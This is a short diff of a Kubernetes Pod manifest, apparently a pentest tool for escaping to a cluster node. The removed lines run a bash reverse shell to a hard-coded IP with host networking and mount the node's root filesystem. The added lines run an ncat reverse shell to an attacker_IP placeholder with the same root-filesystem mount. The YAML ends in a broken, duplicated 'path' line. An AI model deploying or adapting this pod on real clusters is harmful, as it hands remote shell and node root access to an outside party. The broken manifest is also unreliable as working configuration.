@@ -22,22 +22,21 @@ spec:
 apiVersion: v1
 kind: Pod
 metadata:
-  name: reverseshell
+  name: ncat-reverse-shell-pod
   labels:
-    app: pentest
+    app: ncat
 spec:
-  hostNetwork: true
   containers:
-  - name: reverseshell
-    image: ubuntu
-    command: ["/bin/bash", "-c", "--"]
-    args: ["bash -i >& /dev/tcp/4.242.16.43/8999 0>&1"]
+  - name: ncat-reverse-shell
+    image: raesene/ncat
     volumeMounts:
     - mountPath: /host
-      name: noderoot
-  nodeName: aks-userpool-01500227-vmss000000
+      name: hostvolume
+    args: ['<attacker_IP>', '8989', '-e', '/bin/bash']
   volumes:
-    - name: noderoot
-      hostPath:
+  - name: hostvolume
+    hostPath:
+      path: /
+      type: Directory
         path: /
     
